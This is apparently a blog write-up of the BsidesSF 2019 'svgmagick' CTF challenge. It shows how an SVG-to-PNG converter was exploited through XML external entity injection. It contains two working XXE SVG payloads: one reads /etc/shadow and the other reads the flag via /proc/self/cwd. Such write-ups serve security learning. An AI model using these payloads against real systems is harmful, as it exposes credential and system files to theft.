---
layout:     post
title:      'BsidesSF CTF 2019 - svgmagick'
date:       2019-03-11 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'BsidesSF 2019'
---

Another challenge that I've missed during the CTF was the ***scgmagick*** challenge rated for 100 points. Solution is very easy, but required some trial and error. Let's take a look. 

```text
When I render SVGs to PNGs, it's like magic!

Location - https://svgmagic-202d168a.challenges.bsidessf.net/

Note: flag.txt is in the working directory of the server.
```

My first guest was [ImageTragick](https://imagetragick.com/) vulnerability as the name of the challenge may suggest that. Unofrtunately, multiple tries did not find anything interesting, nothing worked so I've decided to move onto another technique. 

But while searching for different vulnerabilites, I've noticed that [XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) is available and we can read files on the local filesystem with this simply crafted ***SVG***. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///etc/shadow" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```

![LFI](/img/bsidessf/svgmagick-passwd.png){:class="img-responsive center-block"}

Now we have LFI with XXE, but another obstacle is reading file in current directory. We cannot do simple `file://flag.txt` as we get a `500` error. 

After some thinking, I used my knowledge from previous challenges that we can take a look at `/proc/` filesystem, especially `/proc/self`. With [that](https://unix.stackexchange.com/questions/94357/find-out-current-working-directory-of-a-running-process) StackOverflow answer we can try to get `/proc/self/cwd/flag.txt` to get the flag. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```

![Flag](/img/bsidessf/svgmagick-flag.png){:class="img-responsive center-block"}
